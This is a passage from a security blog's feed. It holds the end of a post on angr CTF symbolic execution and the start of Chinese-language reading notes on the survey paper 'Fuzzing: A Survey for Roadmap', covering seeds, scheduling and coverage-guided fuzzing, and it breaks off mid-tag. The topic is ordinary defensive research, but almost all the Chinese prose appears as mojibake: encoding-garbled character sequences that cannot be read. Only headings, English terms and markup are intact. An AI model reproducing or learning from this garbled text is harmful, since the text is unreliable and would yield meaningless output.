ç¼–å†™æŠ€å·§ï¼Œä»¥ angr CTF ä¸ºä¾‹ï¼Œè™½ç„¶è¯´æœ€åä¸‰é“æ¼æ´åˆ©ç”¨é¢˜ç›®çœ‹èµ·æ¥å¥½åƒéƒ½æŒºç¬¨ï¼Œä½†è®¾æƒ³å°†ç¬¬ 17 é¢˜æ¢æˆè¿™æ ·çš„ä¸€ä¸ªåœºæ™¯â€”â€”æˆ‘ä»¬æ­£åœ¨æŒ–æ˜ä¸€ä¸ªé€»è¾‘æ¯”è¾ƒå¤æ‚çš„ç°ä»£è½¯ä»¶ï¼ˆä¾‹å¦‚ä¸€ä¸ªå­˜åœ¨æ ˆæº¢å‡ºçš„è·¯ç”±å™¨å›ºä»¶ï¼Œæˆ‘ä»¬çš„è¾“å…¥å¯ä»¥æ˜¯å‘è·¯ç”±å™¨å‘é€çš„æ•°æ®åŒ…ï¼ˆæ¯”å¦‚è¯´å¯¹è·¯ç”±å™¨æ§åˆ¶é¡µçš„ HTTP è¯·æ±‚ï¼‰ï¼‰ï¼Œç›´æ¥é€†å‘å®¡è®¡æ¯”è¾ƒè´¹åŠ²ï¼Œè€Œæš´åŠ› fuzz åˆä¸å¥½æ­æ‰§è¡Œç¯å¢ƒï¼Œæ­¤æ—¶æ— éœ€å®é™…æ‰§è¡ŒäºŒè¿›åˆ¶æ–‡ä»¶çš„ç¬¦å·æ‰§è¡Œä¾¿èƒ½å¾ˆå¥½åœ°å‘æŒ¥å…¶ç”¨å¤„</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ä»¥ä¸Šçš„ 18 é“é¢˜è™½ç„¶çœ‹ä¼¼æ¶µç›–äº† angr çš„åŸºæœ¬ç”¨æ³•ï¼Œä½†å…¶å® angr è¿˜æœ‰æ›´å¤šæ›´æœ‰è¶£çš„ APIï¼Œè‹¥æ˜¯è¦æ›´åŠ ç†Ÿç»ƒçš„è¿ç”¨è¿™ä¸ªé¡¶çº§çš„æ··åˆæ‰§è¡Œæ¡†æ¶ï¼Œåˆ™è¿˜éœ€è¦æˆ‘ä»¬å¤šå¤šé˜…è¯» angr çš„æ–‡æ¡£å¹¶å¤šåŠ ä½¿ç”¨ï¼Œæ¯•ç«Ÿ angr-ctf åªæ˜¯ä¸€ä¸ªæœ€åŸºç¡€çš„ç»ƒæ‰‹çº§çš„é¡¹ç›®ï¼ˆç¬‘ï¼‰</p><p>ç¬¦å·æ‰§è¡Œè¿™ä¸€æŠ€æœ¯æˆ–è®¸è¿˜æœ‰æ›´ä¸ºå…‰æ˜çš„æœªæ¥æ­£ç­‰å¾…ç€æˆ‘ä»¬è¿›è¡Œæ¢ç´¢ï¼šï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä½ è¯´çš„å¯¹ï¼Œä½†æ˜¯ &lt;a href=&quot;https://github.com/angr/angr&quot;&gt;angr&lt;/a&gt; æ˜¯ä¸€ä¸ªä½¿ç”¨ Python ç¼–å†™çš„è·¨å¹³å°å¼€æºäºŒè¿›åˆ¶åˆ†ææ¡†æ¶â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="ANGR" scheme="http://blog.arttnba3.cn/categories/ANGR/"/>
    
    
    <category term="angr" scheme="http://blog.arttnba3.cn/tags/angr/"/>
    
    <category term="ä¿¡æ¯å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="ç¬¦å·æ‰§è¡Œ" scheme="http://blog.arttnba3.cn/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/"/>
    
    <category term="äºŒè¿›åˆ¶å®‰å…¨" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    <category term="äºŒè¿›åˆ¶åˆ†æ" scheme="http://blog.arttnba3.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>ã€PAPER.0x00ã€‘è®ºæ–‡ç¬”è®°ï¼šFuzzing: A Survey for Roadmap </title>
    <link href="http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/"/>
    <id>http://blog.arttnba3.cn/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/</id>
    <published>2022-10-30T05:35:21.000Z</published>
    <updated>2022-10-30T12:18:32.780Z</updated>
    
    <content type="html"><![CDATA[<p>æ¨¡ç³Šæµ‹è¯•ä¸ºä»€ä¹ˆæ˜¯ç¥</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p><em><strong>Fuzzing: A Survey for Roadmap</strong></em> æ˜¯å…³äºæ¨¡ç³Šæµ‹è¯•é¢†åŸŸçš„æ¯”è¾ƒå¥½çš„ä¸€ç¯‡ç»¼è¿°ï¼Œè€Œæ°å·§ç¬”è€…æƒ³è¦å¼€å§‹æ¥è§¦ä¸€äº›å­¦æœ¯ä¸Šçš„ä¸œè¥¿ï¼Œæ‰€ä»¥å†³å®šä»è¿™ç¯‡ç»¼è¿°æ€§è®ºæ–‡å¼€å§‹å…¥æ‰‹å»äº†è§£æ¨¡ç³Šæµ‹è¯•è¿™ä¸€é¢†åŸŸï¼šï¼‰</p><p>è¿™ç¯‡åšå®¢ä¾¿æ˜¯ç¬”è€…çš„ä¸€ä¸ªè¯»ä¹¦ç¬”è®°ï¼Œä¸è¿‡ç¬”è€…ä¸ä¼šå°†è®ºæ–‡å…¨éƒ¨äººå·¥ç¿»è¯‘ååŸæ ·ç…§æ¬è¿‡æ¥ï¼Œè€Œåªä¼šé€‰æ‹©æ¯”è¾ƒç²¾é«“çš„éƒ¨åˆ†ï¼Œå¹¶æŒ‰ç¬”è€…çš„æ„æ€è¿›è¡Œæ’ç‰ˆï¼ˆç¬‘ï¼‰</p><blockquote><p>å½“ç„¶ç°åœ¨çœ‹æ¥å¥½åƒå¤§éƒ¨åˆ†å…¶å®è¿˜æ˜¯ç…§æ¬ç¬”è€…äººå·¥ç¿»è¯‘åçš„è®ºæ–‡åŸæ–‡ï¼Œç¬”è€…åšçš„é¢å¤–å·¥ä½œå¥½åƒä»…ä»…æ˜¯æ’ç‰ˆä¼˜åŒ–â€¦</p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p><strong>Fuzz testing</strong>ï¼ˆfuzzingï¼Œå³æ¨¡ç³Šæµ‹è¯•ï¼‰åœ¨æ£€æµ‹å®‰å…¨æ¼æ´ä¸­å¤§æ”¾å¼‚å½©ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹ï¼ˆtest casesï¼‰å¹¶è§‚æµ‹æ‰§è¡Œç»“æœæ¥å¯»æ‰¾æ¼æ´ï¼Œä¸”å·²åœ¨å¤§é‡çš„åº”ç”¨ä¸­å‘ç°äº†ä¸Šåƒä¸ªæ¼æ´ã€‚è™½ç„¶éå¸¸é«˜æ•ˆï¼Œfuzz ä»ç¼ºä¹ç³»ç»ŸåŒ–çš„å¯¹å…¶ç¼ºé™·çš„åˆ†æï¼š</p><ul><li>fuzz éœ€è¦ç¼©å°<strong>è¾“å…¥ç©ºé—´</strong>ï¼ˆinput spaceï¼‰ä¸<strong>ç¼ºé™·ç©ºé—´</strong>ï¼ˆdefect spaceï¼Œè§¦å‘ç¼ºé™·çš„è¾“å…¥ï¼‰é—´çš„å·®è·ï¼›åœ¨ä¸€ä¸ªåº”ç”¨å½“ä¸­ï¼Œæ¼æ´ï¼ˆdefectsï¼‰çš„å­˜åœ¨æ˜¯åˆ†æ•£çš„ï¼ˆspareï¼‰ï¼Œè¿™æ„å‘³ç€ defects space è¦æ¯” input space å°å¾—å¤š</li><li>fuzzing ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œé‡å¤æµ‹è¯•â€”â€”è¿™éœ€è¦ä¸€ç§è‡ªåŠ¨åŒ–çš„æ–¹æ³•ï¼›ç”±äºç¨‹åºä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œè‡ªåŠ¨åŒ–åœ°æ‰§è¡Œä¸åŒçš„ç¨‹åºä¼šæ˜¯ä¸€ä¸ªæŒ‘æˆ˜</li></ul><p>æœ¬ç¯‡è®ºæ–‡ç³»ç»ŸåŒ–åœ°å›é¡¾å¹¶è¯„ä¼°äº† fuzz çš„ç¼ºé™·æœºå™¨è§£å†³åŠæ³•</p><h1 id="0x01-INTRODUCTION"><a href="#0x01-INTRODUCTION" class="headerlink" title="0x01. INTRODUCTION"></a>0x01. INTRODUCTION</h1><p>è½¯ä»¶æ¼æ´æ˜¯è®¡ç®—æœºç³»ç»Ÿä¸­çš„ä¸€ä¸ªä¸¥é‡çš„é—®é¢˜ï¼Œè€Œ Fuzz testing å·²ç»æˆä¸ºæœ€æˆåŠŸçš„æ£€æµ‹ç¨‹åºæ¼æ´çš„æ–¹æ³•ä¹‹ä¸€ï¼Œå…¶é€šè¿‡ç”Ÿæˆå¤§é‡çš„æµ‹è¯•ç”¨ä¾‹æ¥é‡å¤æµ‹è¯•ç›®æ ‡ç¨‹åºå¹¶è§‚å¯Ÿå…¶<strong>å¼‚å¸¸</strong>ï¼ˆexceptionï¼‰â€”â€”å®‰å…¨æ¼æ´çš„æ ‡å¿—ï¼ˆindicatorï¼‰</p><p>Fuzzing é€šå¸¸æœ‰ç€ä¸€ç»„ç§å­ï¼ˆseedsï¼‰ï¼šinteresting inputsï¼Œæ–°çš„è¾“å…¥çš„ç”Ÿæˆåˆ™åŸºäºè¿™ç»„ç§å­è¿›è¡Œæ— é™çš„å˜å¼‚ï¼ˆmutateï¼‰</p><p>è™½ç„¶ fuzzing åœ¨å‘ç°å®‰å…¨æ¼æ´ä¸Šè·å¾—äº†å·¨å¤§çš„æˆåŠŸï¼Œåœ¨å¼€å‘é«˜æ•ˆçš„æ¼æ´æ£€æµ‹è§£å†³æ–¹æ¡ˆä¸Šä»å­˜åœ¨ç€ç¼ºé™·ï¼Œå¦‚ Fig.1 æ‰€ç¤ºï¼Œä¸‰ä¸ªä¸»è¦çš„ç¼ºé™·æ˜¯ï¼šè¾“å…¥ä¸­åˆ†æ•£çš„æ¼æ´ç©ºé—´ï¼Œä¸¥æ ¼çš„æœ‰æ•ˆè¾“å…¥ç©ºé—´ï¼Œå¤šç›®æ ‡çš„è‡ªåŠ¨åŒ–æ‰§è¡Œ</p><p><img src="https://s2.loli.net/2022/10/26/MoW9IBHGRvk35bV.png" alt="Fig. 1. Illustration of knowledge gaps in the domain of fuzzing. "></p><ul><li><strong>Gap 1: spare defect space of inputs.</strong> åœ¨åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´åˆ†å¸ƒæ˜¯åˆ†æ•£çš„ï¼Œè€Œä»…æœ‰éƒ¨åˆ†ç‰¹å®šçš„è¾“å…¥èƒ½å¤Ÿè§¦å‘æ¼æ´ï¼›æµ…æ˜¾çš„æ¼æ´å¯ä»¥åœ¨çŸ­æ—¶é—´å†…è¢« fuzz åˆ°ï¼Œä½†è®¸å¤šå®‰å…¨æ¼æ´éœ€è¦æµ‹è¯•å¤æ‚çš„æ‰§è¡Œè·¯å¾„å¹¶è§£å†³ä¸¥æ ¼çš„è·¯å¾„çº¦æŸï¼Œå› æ­¤ä¸€ä¸ªé«˜æ•ˆçš„ fuzzing ç®—æ³•éœ€è¦åŒæ—¶å¯¹ <em>å¾…æµ‹è¯•ç¨‹åº</em> ï¼ˆprogram under testï¼Œ <strong>PUTs</strong>ï¼‰ä¸ <em>å®‰å…¨ç¼ºé™·</em> ï¼ˆsecurity flawsï¼‰è¶³å¤Ÿç²¾é€šï¼Œä»¥åœ¨ä¸€ä¸ªæ›´æœ‰å¯èƒ½å­˜åœ¨æ¼æ´çš„ä»£ç åŒºåŸŸé©±åŠ¨è®¡ç®—èµ„æº</li><li><strong>Gap 2: strict valid input space.</strong> å¤§éƒ¨åˆ†ç¨‹åºæœ‰ç€è‡ªå·±çš„è¾“å…¥ç©ºé—´ï¼Œè€Œç°ä»£ç¨‹åºéƒ½ç›¸å½“å¤æ‚ï¼Œéœ€è¦æ›´å¤æ‚çš„ç‰¹åŒ–è¾“å…¥ç©ºé—´ï¼Œå› æ­¤å¦‚ä½•ç”Ÿæˆæœ‰æ•ˆè¾“å…¥åŒæ ·æ˜¯ä¸ªæŒ‘æˆ˜ï¼›æ­¤å¤–ï¼Œä¸ºäº†æé«˜ fuzzing çš„æ•ˆç‡ï¼Œç”Ÿæˆçš„è¾“å…¥åº”å½“ä½¿ç”¨ä¸åŒçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚ <em>ä»£ç è¦†ç›–ç‡</em> ï¼‰ï¼Œè¿™éœ€è¦æ›´å…ˆè¿›çš„æ–¹æ¡ˆæ¥ç”Ÿæˆæœ‰æ•ˆè¾“å…¥ï¼›è‹¥ç¼ºä¹å¯¹ PUTs çš„ç³»ç»ŸåŒ–åˆ†æï¼Œå‡ ä¹ä¸å¯èƒ½ç²¾ç¡®åœ°é™åˆ¶è¾“å…¥ç©ºé—´ï¼ˆä¾‹å¦‚ PDF æ–‡ä»¶çš„å˜å¼‚ç”Ÿæˆå¯èƒ½ä¼šè¿å PDF è§„èŒƒï¼‰</li><li><strong>Gap 3: various target.</strong> ç”±äº fuzzing å¤§é‡é‡å¤åœ°æµ‹è¯• PUTsï¼Œè¿™éœ€è¦é«˜æ•ˆçš„è‡ªåŠ¨åŒ–æ–¹æ³•ã€‚PUTs ä¸æ¼æ´éƒ½æ˜¯å¤šç§å¤šæ ·çš„ï¼Œæœ‰çš„ç¨‹åºå¯ä»¥ç®€å•ç›´æ¥åœ°è¢«è‡ªåŠ¨åŒ–åœ° fuzzï¼ˆä¾‹å¦‚å‘½ä»¤è¡Œç¨‹åºï¼‰ï¼Œä½†è®¸å¤šç¨‹åºåœ¨è‡ªåŠ¨åŒ–æµ‹è¯•å‰éƒ½éœ€è¦åšå¤§é‡çš„å·¥ä½œï¼ˆä¾‹å¦‚ç¡¬ä»¶ï¼‰ï¼›æ­¤å¤–ï¼Œå®‰å…¨ç¼ºé™·åŒæ ·éœ€è¦è‡ªåŠ¨åŒ–çš„ indicator ä»¥è®°å½•æ½œåœ¨çš„çœŸæ­£æ¼æ´ï¼Œ<strong>ç¨‹åºå´©æºƒ</strong>æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ indicator å› ä¸ºå…¶å¯ä»¥è¢« OS è‡ªåŠ¨æ•è·ï¼Œä½†æœ‰çš„å®‰å…¨ç¼ºé™·<strong>å¹¶ä¸ä¼šè¡¨ç°å‡ºå´©æºƒ</strong>ï¼ˆä¾‹å¦‚æ¡ä»¶ç«äº‰ï¼‰ï¼Œè¿™éœ€è¦ç²¾å¿ƒè®¾è®¡çš„ indicator</li></ul><p>ä¸šç•Œåœ¨ç¼©å°è¿™äº›ç¼ºé™·ä¸Šåšå‡ºäº†è®¸å¤šåŠªåŠ›ã€‚åœ¨æœ¬ç¯‡è®ºæ–‡ä¸­ï¼Œç ”ç©¶è€…ç³»ç»ŸåŒ–åœ°å›é¡¾ä¸åˆ†æäº† fuzzing çš„ç¼ºé™·ä¸è§£å†³æ–¹æ¡ˆï¼ŒåŒæ—¶è€ƒè™‘äº†å¹¿åº¦ä¸æ·±åº¦</p><p>æœ¬ç¯‡è®ºæ–‡ç›®å½•å¦‚ä¸‹ï¼š</p><ul><li><strong>Â§2</strong>ï¼šoverview of fuzzing</li><li><strong>Â§3</strong>ï¼šdepicts fuzzing processes and various fuzzing theories to formulate he processes</li><li><strong>Â§4</strong>ï¼šanalyzes diverse solutions to reduce the search space of inputs</li><li><strong>Â§5</strong>ï¼šanalyzes how to automatize the execution of various PUTs and the detection of different bugs.</li><li><strong>Â§6</strong>ï¼šother some directions for future research</li></ul><h1 id="0x02-OVERVIEW-OF-FUZZING"><a href="#0x02-OVERVIEW-OF-FUZZING" class="headerlink" title="0x02. OVERVIEW OF FUZZING"></a>0x02. OVERVIEW OF FUZZING</h1><p><img src="https://s2.loli.net/2022/10/26/u6F7mKtzvRqxNWo.png" alt="Fig. 2. General workflow of fuzzing."></p><p>æˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€äº›æœ¯è¯­ï¼ˆ <strong>Terminologies.</strong> ï¼‰ï¼Œå¦‚ Fig2 æ‰€ç¤ºï¼š</p><ul><li><strong>seed</strong>ï¼šè¢«ä¿ç•™çš„èƒ½å®Œæˆæ›´å¥½çš„ fitness çš„è¾“å…¥ï¼ˆä¾‹å¦‚æä¾›æ–°çš„è¦†ç›–ç‡ï¼‰</li><li><strong>fitness</strong>ï¼šå¯¹ä¸€ä¸ª input&#x2F;seed çš„è´¨é‡çš„æµ‹é‡</li><li><strong>power schedule</strong>ï¼šå†³å®šäº†åˆ†é…ç»™ seeds çš„ energy</li><li><strong>energy</strong>ï¼šåˆ†é…ç»™å½“å‰ fuzzing round çš„å˜å¼‚æ•°é‡</li><li><strong>fuzzer</strong>ï¼šfuzzing ç®—æ³•çš„å®ç°</li></ul><blockquote><p>è¿™é‡Œè®ºæ–‡è¿˜è®²äº†ä¸€æ®µå†å²ï¼Œä¸æŠ„äº†</p></blockquote><p>å¦‚ Fig2 æ‰€ç¤ºï¼Œfuzzing ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š</p><ul><li><strong>input generator</strong>ï¼šè´Ÿè´£å‘ executor æä¾›è¾“å…¥</li><li><strong>executor</strong>ï¼šè´Ÿè´£æ‰§è¡Œè¾“å…¥</li><li><strong>defect monitor</strong>ï¼šè´Ÿè´£æ£€æŸ¥æ˜¯å¦å‘ç°äº†æ–°çš„æ‰§è¡ŒçŠ¶æ€æˆ–ç¼ºé™·ï¼ˆä¾‹å¦‚ crashesï¼‰</li></ul><p>åŸºäºè¾“å…¥çš„ç”Ÿæˆæ–¹å¼ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>åŸºäºç”Ÿæˆçš„</strong> ï¼ˆgeneration-basedï¼‰ï¼šåŸºäº <em>æ–‡æ³•</em> ï¼ˆgrammarsï¼‰æˆ– <em>æœ‰æ•ˆè¯­æ–™åº“</em> ï¼ˆvalid corpusï¼‰ä»å¤´å¼€å§‹ç”Ÿæˆï¼›å¦‚ Fig2 æ‰€ç¤ºï¼Œå…¶ä»ä¸€ç»„ç§å­ä¸­ç›´æ¥è·å¾—è¾“å…¥</li><li><strong>åŸºäºå˜å¼‚çš„</strong>ï¼ˆmutation-basedï¼‰ï¼šå¯¹ç°æœ‰çš„ç§å­è¿›è¡Œ <em>å˜å¼‚</em> ï¼ˆmutateï¼‰ä»¥è·å¾—æ–°çš„è¾“å…¥ï¼›å¯¹ç»™å®šçš„ä¸€ç»„ç§å­ï¼ŒåŸºäºå˜å¼‚çš„æ¨¡ç³Šæµ‹è¯•é€šè¿‡ seed scheduleã€byte scheduleã€mutation schedule ä»¥è·å¾—è¾“å…¥</li></ul><blockquote><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œfuzzing å¹¶ä¸éœ€è¦ç»å† Fig2 ä¸­çš„æ‰€æœ‰æ­¥éª¤ï¼Œä¾‹å¦‚åŸºäºç”Ÿæˆçš„æ¨¡ç³Šæµ‹è¯•å¹¶ä¸æ‰§è¡Œ byte schedule æˆ– mutation scheduleï¼Œä½†å…³æ³¨äºä»åˆå§‹è¾“å…¥æ–‡ä»¶ä¸­é€‰æ‹©æœ€ä¼˜çš„ç§å­ç»„</p></blockquote><p>åŸºäºæ‰§è¡Œæ—¶è§‚æµ‹åˆ°çš„ä¿¡æ¯é‡ï¼Œfuzzing å¯ä»¥åˆ†ä¸ºï¼š</p><ul><li><strong>é»‘ç›’</strong>ï¼ˆblackboxï¼‰ï¼šé»‘ç›’æ¨¡ç³Šæµ‹è¯•å¹¶ä¸çŸ¥é“æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€ï¼Œé€šè¿‡ä½¿ç”¨è¾“å…¥æ ¼å¼åŒ–æˆ–ä¸åŒçš„è¾“å‡ºçŠ¶æ€æ¥è¿›è¡Œä¼˜åŒ–</li><li><strong>ç™½ç›’</strong>ï¼ˆwhiteboxï¼‰ï¼šç™½ç›’æ¨¡ç³Šæµ‹è¯•å¯¹æ¯æ¬¡æ‰§è¡Œçš„å†…éƒ¨çŠ¶æ€æ˜¯å…¨éƒ¨å¾—çŸ¥çš„ï¼Œè¿™ä½¿å…¶èƒ½ç³»ç»ŸåŒ–åœ°æ¢ç´¢ç›®æ ‡ç¨‹åºçš„çŠ¶æ€ç©ºé—´ï¼›å…¶é€šå¸¸ä½¿ç”¨ concolic executionï¼ˆä¾‹å¦‚ <em>dynamic symbolic executionï¼Œå³åŠ¨æ€ç¬¦å·æ‰§è¡Œ</em> ï¼‰æ¥åˆ†æç›®æ ‡ç¨‹åº</li><li><strong>ç°ç›’</strong>ï¼ˆgreyboxï¼‰ï¼šç°ç›’æ¨¡ç³Šæµ‹è¯•è·å¾—çš„æ‰§è¡ŒçŠ¶æ€ä¿¡æ¯åœ¨é»‘ç›’ä¸ç™½ç›’ä¹‹é—´ï¼Œä¾‹å¦‚è®¸å¤š fuzzer éƒ½ä½¿ç”¨ <em>è¾¹ç•Œè¦†ç›–ç‡</em> ï¼ˆedge coverageï¼‰ä½œä¸ºå†…éƒ¨æ‰§è¡ŒçŠ¶æ€</li></ul><p>æœ€é€šç”¨çš„æ‰§è¡ŒçŠ¶æ€ä¾¿æ˜¯<strong>ä»£ç è¦†ç›–ç‡</strong>ï¼ˆcode coverageï¼Œä¾‹å¦‚ CFGsï¼ˆcontrol flow graphsï¼‰ ä¸­çš„åŸºæœ¬å—ï¼ˆbasic blockã€è¾¹ï¼ˆedgesï¼‰ï¼‰ï¼Œè¦†ç›–ç‡çš„åŸºæœ¬å‡è®¾ç”¨æ³•æ˜¯ï¼šå‘ç°æ›´å¤šçš„æ‰§è¡ŒçŠ¶æ€ï¼ˆä¾‹å¦‚æ–°çš„è¦†ç›–ç‡ï¼‰èƒ½æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ã€‚å› æ­¤ <em>è¦†ç›–ç‡æŒ‡å¯¼</em> ï¼ˆcoverage-guidedï¼‰çš„æ¨¡ç³Šæµ‹è¯•çš„ç›®æ ‡ä¾¿æ˜¯è¦†ç›–æ›´å¤šçš„ä»£ç </p><blockquote><p> ä½†æ‰§è¡ŒçŠ¶æ€å¹¶ä¸é™åˆ¶äºä»£ç è¦†ç›–ç‡ï¼Œå¯¹é¢å‘å¯¹è±¡ç¨‹åºï¼ˆobject-oriented programsï¼‰è€Œè¨€ä¹Ÿå¯ä»¥æ˜¯æ‰§è¡Œçš„åˆæ³•æ€§ï¼ˆlegalityï¼‰ï¼Œå¯¹åè®®å®ç°ï¼ˆprotocol implementationsï¼‰å¯ä»¥æ˜¯çŠ¶æ€æœºï¼ˆstate machineï¼‰ï¼Œå¯¹å¹¶å‘å®ç°ï¼ˆconcurrencyï¼‰å¯ä»¥æ˜¯ alias coverageï¼Œå¯¹æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼ˆdeep learning modelsï¼‰å¯ä»¥æ˜¯ç¥ç»è¦†ç›–ç‡ï¼ˆneuron coverageï¼‰ï¼Œå¯¹å®‰å“æ™ºèƒ½ç”µè§†åˆ™å¯ä»¥æ˜¯æ‰§è¡Œæ—¥å¿—ï¼ˆexecution logsï¼‰</p></blockquote><p>Fuzzer é€šå¸¸ä½¿ç”¨ <em>å´©æºƒ</em> ï¼ˆcrashesï¼‰ä½œä¸ºå®‰å…¨æ¼æ´çš„æŒ‡ç¤ºå™¨ï¼Œå› ä¸º crashes æä¾›äº†ç›´æ¥çš„è‡ªåŠ¨è®°å½•ï¼ˆOS ä¼šè‡ªåŠ¨å‘å‡ºä¿¡å·å‘ŠçŸ¥ç¨‹åºå´©æºƒï¼‰ï¼Œç„¶è€Œæœ‰çš„ç¼ºé™·å¹¶ä¸ä¼šæ˜¾ç¤ºå‡º crashesï¼Œå› æ­¤ fuzzer ä½¿ç”¨å…¶ä»–çš„æŒ‡ç¤ºå™¨ï¼Œä¾‹å¦‚ physical safety violation</p><p>ä½† indicators ä»…æ˜¾ç¤ºäº†å¯èƒ½çš„å®‰å…¨é—®é¢˜ï¼Œè¿˜éœ€è¦å®‰å…¨å·¥å…·æˆ–äººå·¥ç¡®è®¤è¿™æ˜¯ä¸€ä¸ª <em>æ¼æ´</em> ï¼ˆvulnerabilityï¼‰</p><h1 id="0x03-FUZZING-THEORY"><a href="#0x03-FUZZING-THEORY" class="headerlink" title="0x03. FUZZING THEORY"></a>0x03. FUZZING THEORY</h1><p>ä¸ºäº†æé«˜å‘ç°æ¼æ´çš„æ¦‚ç‡ï¼Œfuzzer åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä½¿ç”¨åé¦ˆï¼ˆfeedbackï¼‰æœºåˆ¶ï¼Œä¾‹å¦‚ä»¥æ‰§è¡ŒçŠ¶æ€æˆ–ç»“æœä½œä¸º fitnesï¼Œä¸€ä¸ªå…¸å‹çš„ fitness ä¾¿æ˜¯åŸºäºä»£ç è¦†ç›–ç‡ï¼ˆä¾‹å¦‚åŸºæœ¬å—æˆ–è¾¹ï¼‰è¿›è¡Œè¾“å…¥ç”Ÿæˆï¼Œä½†ä»…æœ‰ä»£ç è¦†ç›–ç‡<strong>å¹¶éä¸€ç›´éƒ½æ˜¯å¯é çš„</strong>ï¼Œå°±ç®—å¯é ä¹Ÿå¯èƒ½æ”¶ç›Šä¸é«˜ï¼ˆä¾‹å¦‚æŒ‡æ•°å‹æ•°é‡çš„è¾“å…¥ç”Ÿæˆå¯èƒ½åªå¸¦æ¥çº¿æ€§çš„æ¼æ´å‘ç°ï¼‰ï¼Œå› æ­¤ä¸€ç§å¸¸è§çš„æ”¹è¿›æ–¹æ³•æ˜¯ä¼˜åŒ–æ¨¡ç³Šæµ‹è¯•çš„è¿‡ç¨‹æˆ–æ˜¯ä¸º fitness ä¸°å¯Œä¿¡æ¯ï¼ŒTable 1 å±•ç¤ºäº†ä¸åŒçš„ fuzzer çš„ä¼˜åŒ–æ–¹æ³•ï¼š</p><p><img src="https://s2.loli.net/2022/10/26/tgGbHp5JRn8zkIS.png" alt="Table 1. Fuzzers and their optimization solutions. "></p><h2 id="3-1-Seed-Set-Selection"><a href="#3-1-Seed-Set-Selection" class="headerlink" title="3.1 Seed Set Selection"></a>3.1 Seed Set Selection</h2><p>å¯¹ç§å­é›†çš„ä¼˜åŒ–å…³æ³¨äº<strong>æœ€å°åŒ–ç§å­é›†çš„å¤§å°</strong>ï¼Œä¾‹å¦‚é€‰æ‹©èƒ½è¦†ç›–æ‰€æœ‰å·²å‘ç°ä»£ç è¦†ç›–çš„ä¸€ç»„æœ€å°‘çš„ç§å­ï¼Œå› ä¸ºè¿‡äºå¯Œé›†çš„ç§å­ä¼šåœ¨æ£€éªŒå·²æ¢æµ‹ä»£ç åŒºåŸŸä¸Šæµªè´¹è®¡ç®—èµ„æº</p><blockquote><p>åœ¨ <a href="https://www.usenix.org/conference/usenixsecurity14/technical-sessions/presentation/rebert">UESIX çš„ä¸€ç¯‡è®ºæ–‡</a> ä¸­å…¶è¢«è¡¨è¿°ä¸º <em>æœ€å°è¦†ç›–é›†é—®é¢˜</em> ï¼ˆminimal set coverage problemï¼ŒMSCPï¼‰ </p></blockquote><h2 id="3-2-Seed-Schedule"><a href="#3-2-Seed-Schedule" class="headerlink" title="3.2 Seed Schedule"></a>3.2 Seed Schedule</h2><p><strong>ç§å­è°ƒåº¦</strong>ï¼ˆseed scheduleï¼‰æœŸæœ›è§£å†³å¦‚ä¸‹é—®é¢˜ï¼š</p><ul><li>åœ¨ä¸‹ä¸€è½®ä¸­é€‰æ‹©å“ªä¸ªç§å­</li><li>ä¸ºè¯¥ç§å­åˆ†é…çš„æ—¶é—´é¢„ç®—ï¼ˆtime budgetï¼‰ï¼›å¤§éƒ¨åˆ† fuzzer å®é™…ä¸Šé€‰æ‹©ä¼˜åŒ–å¯¹è¢«é€‰å–ç§å­çš„å˜å¼‚æ¬¡æ•°</li></ul><p>ç”±äº PUTs ä¸æ¼æ´çš„å¤æ‚æ€§ï¼Œæœªå‘ç°ä»£ç è¦†ç›–ç‡ä¸æœªå‘ç°æ¼æ´æ˜¯ä¸å¯çŸ¥çš„ï¼Œæˆ‘ä»¬æ— æ³•çŸ¥é“ä¸€ä¸ªè¾“å…¥æ˜¯å¦èƒ½è§¦å‘æ¼æ´ï¼Œç±»ä¼¼åœ°åœ¨æ£€ç´¢ä»£ç ä¹‹å‰æˆ‘ä»¬ä¹Ÿä¸èƒ½è·å¾—ç¨‹åºè¡Œä¸ºçš„æ¦‚ç‡åˆ†å¸ƒï¼Œå› æ­¤æ•°å­¦ä¸Šæˆ‘ä»¬å‡ ä¹ä¸å¯èƒ½æ‰¾åˆ°ä¸€ä¸ªå…¨é¢çš„ä¼˜åŒ–è§£æ³•ï¼Œå› æ­¤ç ”ç©¶äººå‘˜åŸºäºå¤šç§ä¼˜åŒ–æ–¹æ³•æ¥è¿‘ä¼¼åœ°è§£å†³è¿™ä¸ªé—®é¢˜</p><h3 id="3-2-1-Fitness-by-Bugs"><a href="#3-2-1-Fitness-by-Bugs" class="headerlink" 